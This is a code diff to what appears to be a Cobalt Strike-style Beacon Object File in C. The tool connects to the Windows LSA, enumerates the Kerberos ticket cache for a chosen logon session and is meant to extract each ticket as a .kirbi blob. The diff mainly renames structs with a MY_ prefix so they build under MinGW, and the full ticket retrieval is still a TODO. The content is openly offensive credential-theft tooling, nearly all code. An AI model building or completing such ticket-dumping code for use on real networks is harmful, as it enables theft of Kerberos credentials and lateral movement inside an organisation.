@@ -3,9 +3,9 @@
  *
  * Uses secur32.dll:
  *   LsaConnectUntrusted -> LsaLookupAuthenticationPackage("Kerberos")
- *   -> LsaCallAuthenticationPackage(KERB_RETRIEVE_TKT_REQUEST)
+ *   -> LsaCallAuthenticationPackage(MY_KERB_RETRIEVE_TKT_REQUEST)
  *
- * First enumerates tickets (KERB_QUERY_TKT_CACHE_EX_REQUEST),
+ * First enumerates tickets (MY_KERB_QUERY_TKT_CACHE_EX_REQUEST),
  * then retrieves each one as a full .kirbi blob.
  */
 #include <windows.h>
@@ -29,13 +29,21 @@ DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);
 #define KerbQueryTicketCacheExMessage    14
 #define KerbRetrieveEncodedTicketMessage  8
 
+/*
+ * These structs may already be defined in MinGW's ntsecapi.h.
+ * Only define them if the header didn't provide them.
+ */
 #pragma pack(push, 1)
-typedef struct {
+
+#ifndef _MY_KERB_QUERY_TKT_CACHE_EX_REQUEST_DEFINED
+#define _MY_KERB_QUERY_TKT_CACHE_EX_REQUEST_DEFINED
+typedef struct _MY_KERB_QUERY_TKT_CACHE_EX_REQUEST {
     ULONG MessageType;   /* KerbQueryTicketCacheExMessage = 14 */
     LUID  LogonId;
-} KERB_QUERY_TKT_CACHE_EX_REQUEST;
+} MY_KERB_QUERY_TKT_CACHE_EX_REQUEST;
+#endif
 
-typedef struct {
+typedef struct _MY_KERB_TICKET_CACHE_INFO_EX {
     UNICODE_STRING ClientName;
     UNICODE_STRING ClientRealm;
     UNICODE_STRING ServerName;
@@ -45,15 +53,15 @@ typedef struct {
     LARGE_INTEGER  RenewTime;
     LONG           EncryptionType;
     ULONG          TicketFlags;
-} KERB_TICKET_CACHE_INFO_EX;
+} MY_KERB_TICKET_CACHE_INFO_EX;
 
-typedef struct {
+typedef struct _MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE {
     ULONG MessageType;
     ULONG CountOfTickets;
-    /* Followed by KERB_TICKET_CACHE_INFO_EX[CountOfTickets] */
-} KERB_QUERY_TKT_CACHE_EX_RESPONSE;
+    /* Followed by MY_KERB_TICKET_CACHE_INFO_EX[CountOfTickets] */
+} MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE;
 
-typedef struct {
+typedef struct _MY_KERB_RETRIEVE_TKT_REQUEST {
     ULONG          MessageType;  /* KerbRetrieveEncodedTicketMessage = 8 */
     LUID           LogonId;
     SecHandle      TargetName;   /* Not used for cache retrieval */
@@ -61,12 +69,8 @@ typedef struct {
     ULONG          CacheOptions; /* KERB_RETRIEVE_TICKET_AS_KERB_CRED = 8 */
     LONG           EncryptionType;
     SecHandle      CredentialsHandle;
-} KERB_RETRIEVE_TKT_REQUEST;
+} MY_KERB_RETRIEVE_TKT_REQUEST;
 
-typedef struct {
-    KERB_RETRIEVE_TKT_REQUEST;
-    UNICODE_STRING TargetNameStr;
-} KERB_RETRIEVE_TKT_REQUEST_EX;
 #pragma pack(pop)
 
 static char *base64_encode_simple(const unsigned char *data, int len) {
@@ -127,11 +131,11 @@ void go(char *args, int args_len) {
     }
 
     /* 1. Enumerate cached tickets */
-    KERB_QUERY_TKT_CACHE_EX_REQUEST cacheReq;
+    MY_KERB_QUERY_TKT_CACHE_EX_REQUEST cacheReq;
     cacheReq.MessageType = KerbQueryTicketCacheExMessage;
     cacheReq.LogonId = targetLuid;
 
-    KERB_QUERY_TKT_CACHE_EX_RESPONSE *cacheResp = NULL;
+    MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE *cacheResp = NULL;
     ULONG cacheRespLen = 0;
     NTSTATUS protStatus;
 
@@ -149,8 +153,8 @@ void go(char *args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %u cached ticket(s)\n", cacheResp->CountOfTickets);
 
     /* 2. For each ticket, retrieve the full .kirbi */
-    KERB_TICKET_CACHE_INFO_EX *tickets =
-        (KERB_TICKET_CACHE_INFO_EX *)((PBYTE)cacheResp + sizeof(KERB_QUERY_TKT_CACHE_EX_RESPONSE));
+    MY_KERB_TICKET_CACHE_INFO_EX *tickets =
+        (MY_KERB_TICKET_CACHE_INFO_EX *)((PBYTE)cacheResp + sizeof(MY_KERB_QUERY_TKT_CACHE_EX_RESPONSE));
 
     int extracted = 0;
     for (ULONG i = 0; i < cacheResp->CountOfTickets; i++) {
@@ -185,7 +189,7 @@ void go(char *args, int args_len) {
             i, clientName, clientRealm, serverName, serverRealm,
             tickets[i].EncryptionType, tickets[i].TicketFlags);
 
-        /* TODO: Call LsaCallAuthenticationPackage with KERB_RETRIEVE_TKT_REQUEST
+        /* TODO: Call LsaCallAuthenticationPackage with MY_KERB_RETRIEVE_TKT_REQUEST
          * to get the full ticket data, then base64-encode as .kirbi */
         extracted++;
     }
